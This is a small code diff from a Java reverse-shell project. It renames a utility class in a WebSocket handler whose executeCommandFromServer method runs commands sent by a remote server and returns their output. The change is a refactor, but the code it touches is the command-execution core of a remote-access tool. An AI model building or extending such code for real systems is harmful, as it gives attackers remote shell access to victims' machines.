@@ -7,7 +7,7 @@ import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
 import com.mtattab.reverseshell.util.DataManipulationUtil;
 import com.mtattab.reverseshell.util.OSUtil;
 import com.mtattab.reverseshell.util.ReverseShellSession;
-import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
+import com.mtattab.reverseshell.util.SystemCommandUtil;
 import lombok.Getter;
 import lombok.Setter;
 import lombok.extern.java.Log;
@@ -42,7 +42,7 @@ public class WebSocketImpl extends WebSocketAdapter {
     }
     private void executeCommandFromServer(ManagerCommunicationModel command){
         if (command != null){
-            String commandResponse = SystemCommandProxyUtil.runCommand(command.getMsg());
+            String commandResponse = SystemCommandUtil.runCommand(command.getMsg());
 //            System.out.println(commandResponse.length());
 
             try {
